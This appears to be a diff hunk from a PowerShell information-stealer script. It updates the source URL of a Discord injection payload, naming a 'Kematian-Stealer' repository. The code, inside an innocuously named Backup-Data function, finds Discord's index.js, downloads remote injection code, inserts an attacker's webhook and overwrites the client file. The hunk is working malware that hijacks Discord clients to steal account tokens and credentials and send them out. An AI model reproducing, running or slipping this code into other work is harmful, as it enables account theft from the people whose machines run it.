@@ -1022,7 +1022,7 @@ function Backup-Data {
                 foreach ($file in $files) {
                     if ($file.Name -eq "index.js") {
                         $webClient = New-Object System.Net.WebClient
-                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/s1uiasdad/Discord-Injection/main/injection.js")
+                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/injection.js")
                         if ($content -ne "") {
                             $replacedContent = $content -replace "%WEBHOOK%", $webhook
                             $replacedContent | Set-Content -Path $file.FullName -Force
